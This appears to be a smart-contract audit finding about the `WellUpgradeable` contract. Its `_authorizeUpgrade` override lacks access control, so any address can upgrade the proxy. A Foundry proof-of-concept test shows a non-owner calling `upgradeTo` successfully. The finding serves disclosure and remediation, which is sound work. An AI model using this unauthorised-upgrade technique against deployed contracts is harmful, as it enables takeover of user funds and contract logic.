# Vulnerability details

## Impact
`WellUpgradeable` is an upgradeable version of the `Well` contract, inheriting from OpenZeppelin's `UUPSUpgradeable` and `OwnableUpgradeable` contracts. According to OpenZeppelin’s documentation for `UUPSUpgradeable.sol` ([here](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable:~:text=The%20_authorizeUpgrade%20function%20must%20be%20overridden%20to%20include%20access%20restriction%20to%20the%20upgrade%20mechanism.) and [here](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable-_authorizeUpgrade-address-)), the internal `_authorizeUpgrade` function must be overridden to include access restriction, typically using the `onlyOwner` modifier. This must be done to prevent unauthorized users from upgrading the contract to a potentially malicious implementation.

However, in the current implementation the `_authorizeUpgrade` function is overridden with custom logic but lacks the `onlyOwner` modifier. As a result, the `upgradeTo` and `upgradeToAndCall` methods can be invoked by any address, allowing anyone to upgrade the contract, leading to the deployment of malicious code and compromise the integrity of the contract.
## Proof of concept
The following test demonstrates that `WellUpgradeable` can be upgraded by any address, not just the owner. It is based on `testUpgradeToNewImplementation` with the difference that a new user address is created and used to call the `upgradeTo` function, successfully upgrading the contract and exposing the lack of access control.  
Paste the following test into `WellUpgradeable.t.sol`:
```solidity
function testUpgradeToNewImplementationNotOwner() public {
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = new MockToken("BEAN", "BEAN", 6);
        tokens[1] = new MockToken("WETH", "WETH", 18);
        Call memory wellFunction = Call(wellFunctionAddress, abi.encode("2"));
        Call[] memory pumps = new Call[](1);
        pumps[0] = Call(mockPumpAddress, abi.encode("2"));
        // create new mock Well Implementation:
        address wellImpl = address(new MockWellUpgradeable());
        WellUpgradeable well2 =
            encodeAndBoreWellUpgradeable(aquifer, wellImpl, tokens, wellFunction, pumps, bytes32(abi.encode("2")));
        vm.label(address(well2), "upgradeableWell2");
        
        address user = makeAddr("user");
        vm.startPrank(user);
        WellUpgradeable proxy = WellUpgradeable(payable(proxyAddress));
        proxy.upgradeTo(address(well2));

        // verify proxy was upgraded.
        assertEq(address(well2), MockWellUpgradeable(proxyAddress).getImplementation());
        vm.stopPrank();
    }
```
